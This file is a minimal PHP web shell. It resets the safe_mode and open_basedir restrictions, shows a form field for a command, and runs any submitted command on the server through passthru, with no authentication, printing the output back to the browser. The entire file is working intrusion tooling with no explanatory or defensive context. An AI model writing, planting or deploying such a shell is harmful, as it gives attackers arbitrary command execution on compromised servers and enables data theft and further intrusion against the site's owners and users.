<?
ini_restore("safe_mode");
ini_restore("open_basedir");
$cmd = $_POST["cmd"];
?>
<form name="form1" method="post" action="">
  <input type="text" name="cmd" value="<?echo $cmd;?>" size="150">
  <input type="submit" name="B_SUBMIT" value="Go">
</form>
<?
if ($cmd != "") {
    echo "<pre>";
    $cmd=stripslashes($cmd);
    echo "Executing $cmd \n";
    echo passthru("$cmd");
    echo "</pre>";
    exit;
}
?>
